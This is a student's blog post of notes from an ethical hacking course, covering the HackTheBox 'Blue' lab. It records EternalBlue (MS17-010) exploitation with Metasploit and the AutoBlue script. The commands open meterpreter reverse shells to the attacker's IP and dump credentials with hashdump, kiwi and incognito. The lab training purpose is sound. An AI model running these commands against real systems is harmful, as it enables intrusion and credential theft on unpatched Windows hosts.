---
layout:     post
title:      TCM PEH Hacking Blue Notes
date:       2021-03-13
summary:    TheCyberMentor's Practical Ethical Hacking course, HackTheBox Blue notes
categories: certs
thumbnail: cogs
tags:
 - htb
 - certs
---




<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Blue_0"></a>HTB Blue</h2>
<p class="has-line-data" data-line-start="1" data-line-end="4">ms17-010 eternal blue<br>
you’ll see this on penetration tests all the time internal to network<br>
NOTE: EternalBlue can bring down the machine</p>
<p class="has-line-data" data-line-start="5" data-line-end="9">nmap -A -T4 -p- 10.10.10.40<br>
Noted 139 open<br>
Noted 445 open<br>
Noted Windows 7 SP1 &lt;-------Always think EternalBlue</p>
<hr>
<p class="has-line-data" data-line-start="10" data-line-end="29">msfconsole<br>
search ms17-010<br>
Noted an auxiliary scanner for ms17_010<br>
use auxiliary/scanner/smb/ms17_010_eternalblue<br>
options<br>
set rhost 10.10.10.40<br>
options<br>
exploit<br>
Noted result “host is likely vulnerable”<br>
use exploit/windows/smb/ms17_010_eternalblue<br>
options<br>
set rhost 10.10.10.40<br>
show targets<br>
exploit<br>
NOTE: This exploit doesn’t always work the first time<br>
Noted shell created<br>
whoami<br>
hostname<br>
ctrl+c to trash shell back to metasploit</p>
<hr>
<p class="has-line-data" data-line-start="30" data-line-end="54">payloads<br>
set payload windows/x64/meterpreter/reverse_tcp<br>
options<br>
exploit<br>
Noted shell created<br>
getuid<br>
sysinfo<br>
hashdump<br>
shell<br>
route print<br>
arp -a<br>
netstat -ao<br>
ctrl+c to trash shell back to meterpreter<br>
ps<br>
Noted that this 4444 shell is an svchost.exe process<br>
load kiwi<br>
help<br>
creds_all<br>
lsa_dump_sam<br>
lsa_dump_secrets<br>
load incognito<br>
list_tokens -u<br>
exit to dump shell back to metasploit<br>
exit to dump metasploit</p>
<hr>
<p class="has-line-data" data-line-start="55" data-line-end="87">Googled autoblue github<br>
Noted result link at github<br>
cd /opt<br>
git clone <a href="https://github">https://github</a>…com/3ndg4me/AutoBlue-MS17-010.git<br>
cd AutoBlue*<br>
ls<br>
python eternalblue_checker.py 10.10.10.40<br>
Noted result “target is not patched”<br>
cd ./shellcode<br>
./shell_prep.sh<br>
y<br>
10.10.14.24<br>
4445<br>
4448<br>
0<br>
0<br>
cd …<br>
ls<br>
./listener_prep.sh<br>
10.10.14.24<br>
4445<br>
4446<br>
0<br>
0<br>
Noted metasploit multihandler opened<br>
cd …<br>
ls<br>
python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin<br>
Noted session in metasploit multihandler<br>
sessions 1<br>
getuid<br>
hostname</p>


